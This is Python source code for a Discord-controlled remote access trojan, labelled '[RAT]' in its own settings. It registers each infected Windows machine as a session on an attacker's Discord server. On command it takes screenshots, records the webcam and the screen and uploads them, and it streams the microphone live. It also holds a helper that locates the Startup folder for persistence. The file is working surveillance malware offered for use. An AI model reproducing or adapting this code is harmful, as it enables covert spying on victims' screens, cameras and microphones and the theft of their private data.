import discord
from discord.ext import commands
from dotenv import load_dotenv
import os
import shutil
import string
import random
import tempfile
import winreg
import pyscreenshot 
import cv2
import mss  # Import mss for screen capture
import numpy as np
import pyaudio

# Load environment variables
load_dotenv()
TOKEN = os.getenv("DISCORD_BOT_TOKEN")
SERVER_ID = int(os.getenv("SERVER_ID"))

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# Configuration
SESSION_NAME_LEN = 10
PREFIX_FOR_MARKING = "[RAT]"
SUFFIX_FOR_MARKING = "99002"
DELETE_OLD_CHANNELS = True
CHANNEL_NAMES = ['main']
CHUNK = 960
FORMAT = pyaudio.paInt16
CHANNELS = 2
RATE = 48000
CURRENT_DIRECTORY = os.path.dirname(os.path.abspath(__file__))

class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=CHANNELS, rate=RATE, chunk=CHUNK, input_device=1) -> None:
        print("Initializing PyAudioPCM...")
        p = pyaudio.PyAudio()
        self.chunk = chunk
        self.input_stream = p.open(
            format=FORMAT,
            channels=channels,
            rate=rate,
            input=True,
            input_device_index=input_device,
            frames_per_buffer=chunk
        )
        print("PyAudioPCM initialized.")

    def read(self) -> bytes:
        return self.input_stream.read(self.chunk)

def get_startup_folder():
    """Get the path to the Startup folder."""
    key = r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key) as reg_key:
        return winreg.QueryValueEx(reg_key, 'Startup')[0]

def random_ascii(length=SESSION_NAME_LEN):
    """Generate a random session name."""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length)).upper()

def exists(temp_dir, suffix=SUFFIX_FOR_MARKING):
    for folder in os.listdir(temp_dir):
        if folder.endswith(suffix):
            return folder.removesuffix(suffix)
    return None

def make_temp_dir(session_name, temp_dir, suffix=SUFFIX_FOR_MARKING):
    """Create a temporary directory with the specified session name and suffix."""
    os.makedirs(os.path.join(temp_dir, session_name + suffix), exist_ok=True)

async def prep_for_discord(guild, channel_names, prefix_for_marking, delete_old_channels, session_name):
    """Prepare categories and channels in the Discord guild."""
    category_name = prefix_for_marking + session_name
    category = discord.utils.get(guild.categories, name=category_name)
    
    if not category:
        try:
            category = await guild.create_category(name=category_name)
            print(f"Created category '{category_name}' in '{guild.name}'")
        except discord.Forbidden:
            print(f"Missing permissions to create a category in '{guild.name}'.")
            return
        except discord.HTTPException as e:
            print(f"Failed to create category in '{guild.name}': {e}")
            return

    for channel_name in channel_names:
        try:
            await guild.create_text_channel(name=channel_name, category=category)
            print(f"Created channel '{channel_name}' in category '{category.name}'")
        except discord.Forbidden:
            print(f"Missing permissions to create a channel in '{guild.name}'.")
        except discord.HTTPException as e:
            print(f"Failed to create channel in '{guild.name}': {e}")

    if delete_old_channels:
        for cat in guild.categories:
            if cat.name.startswith(prefix_for_marking) and not cat.name.endswith(session_name):
                for channel in cat.channels:
                    for channel_name in channel_names:
                        if channel.name == channel_name:
                            continue
                        await channel.delete()
                await cat.delete()

TEMP_DIR = tempfile.gettempdir()
session_name = random_ascii()
existing_session_name = exists(TEMP_DIR)

@bot.event
async def on_ready():
    global session_name
    print(f'Logged in as {bot.user}!')
    
    guild = bot.get_guild(SERVER_ID)
    if not guild:
        print(f"Guild with ID {SERVER_ID} not found.")
        return
    if existing_session_name:
        session_name = existing_session_name
        print(f"Session already exists: {session_name}")
        category = discord.utils.get(guild.categories, name=PREFIX_FOR_MARKING + session_name)
        if category:
            for channel in category.channels:
                if channel.name in CHANNEL_NAMES:
                    await channel.send("`@everyone online!`")
                    break
    else:
        print("Creating new session...")
        make_temp_dir(session_name, TEMP_DIR)
        await prep_for_discord(guild, CHANNEL_NAMES, PREFIX_FOR_MARKING, DELETE_OLD_CHANNELS, session_name)
        category = discord.utils.get(guild.categories, name=PREFIX_FOR_MARKING + session_name)
        if category:
            for channel in category.channels:
                if channel.name in CHANNEL_NAMES:
                    await channel.send("`@everyone online!`")
                    break
    # shutil.move('libopus-0.dll', os.path.join(TEMP_DIR, 'libopus-0.dll'))
    discord.opus.load_opus(os.path.join(CURRENT_DIRECTORY, 'libopus-0.x64.dll'))


@bot.command(name='ss')
async def screenshot(ctx):
    try:
        screenshot = pyscreenshot.grab()
        name = random_ascii(5) + ".png"  # Ensure file extension is added
        screenshot_path = os.path.join(TEMP_DIR, name)
        screenshot.save(screenshot_path)
        
        # Send the screenshot
        with open(screenshot_path, 'rb') as f:
            await ctx.send(file=discord.File(f, 'Screenshot.png'))
        
        # Clean up
        os.remove(screenshot_path)
    except Exception as e:
        await ctx.send(f"`An error occurred: {e}`")

@bot.command(name='record')
async def record_video(ctx, duration: int = 5):
    """
    Records a video using the webcam for the specified duration (in seconds)
    and sends it to the Discord channel.
    """
    try:
        # Initialize video capture (use cv2.CAP_DSHOW on Windows for DirectShow)
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            await ctx.send("`Failed to open camera.`")
            return

        # Define the codec and create a VideoWriter object (using .mp4 format)
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_path = os.path.join(tempfile.gettempdir(), "recorded_video.mp4")
        out = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))

        # Record video for the specified duration
        frames_to_record = duration * 20  # 20 FPS
        frame_count = 0
        while cap.isOpened() and frame_count < frames_to_record:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
            frame_count += 1

        # Release the capture and writer objects
        cap.release()
        out.release()

        # Send the video file as an attachment
        with open(video_path, 'rb') as f:
            await ctx.send(file=discord.File(f, 'recorded_video.mp4'))

        # Clean up by removing the saved video file
        os.remove(video_path)

    except Exception as e:
        await ctx.send(f"`An error occurred: {e}`")
@bot.command(name='record_screen')
async def record_screen(ctx, duration: int = 5):
    """
    Records a video of the screen for the specified duration (in seconds)
    and sends it to the Discord channel.

    Args:
    - ctx: The context in which a command is called.
    - duration: Duration of the video to capture (in seconds).
    """
    try:
        # Set up MSS for screen capture
        sct = mss.mss()

        # Define the screen resolution and the video codec and output file
        monitor = sct.monitors[1]  # Capture the first monitor (or adjust for your setup)
        width, height = monitor["width"], monitor["height"]
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_path = os.path.join(tempfile.gettempdir(), os.path.join(TEMP_DIR, "screen_recording.mp4"))
        out = cv2.VideoWriter(video_path, fourcc, 20.0, (width, height))  # 20 FPS

        # Record screen video for the specified duration
        frames_to_record = duration * 20  # 20 frames per second (FPS)
        frame_count = 0
        while frame_count < frames_to_record:
            # Capture the screen
            img = sct.grab(monitor)
            frame = np.array(img)  # Convert the captured image to a numpy array
            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)  # Convert BGRA to BGR format for OpenCV
            
            # Write the frame to the output file
            out.write(frame)
            frame_count += 1

        # Release the video writer object
        out.release()

        # Send the video file as an attachment
        with open(video_path, 'rb') as f:
            await ctx.send(file=discord.File(f, os.path.join(TEMP_DIR, "screen_recording.mp4")))

        # Clean up by removing the saved video file
        os.remove(video_path)

    except Exception as e:
        await ctx.send(f"`An error occurred: {e}`")

@bot.command(name='join')
async def join(ctx):
    if ctx.author.voice:
        voice_channel = ctx.author.voice.channel
        if ctx.voice_client:
            await ctx.voice_client.move_to(voice_channel)
        else:
            await voice_channel.connect(self_deaf=True)
        
        # Start streaming audio from the microphone
        if ctx.voice_client:
            ctx.voice_client.play(PyAudioPCM())
            await ctx.send('`Joined voice channel and started streaming microphone audio.`')
    else:
        await ctx.send("`You are not connected to a voice channel.`")
@bot.command(name='leave')
async def leave(ctx):
    if ctx.voice_client:
        ctx.voice_client.stop()
        await ctx.voice_client.disconnect()
        await ctx.send('`Disconnected from the voice channel.`')
    else:
        await ctx.send("`The bot is not connected to any voice channel.`")

bot.run(TOKEN)
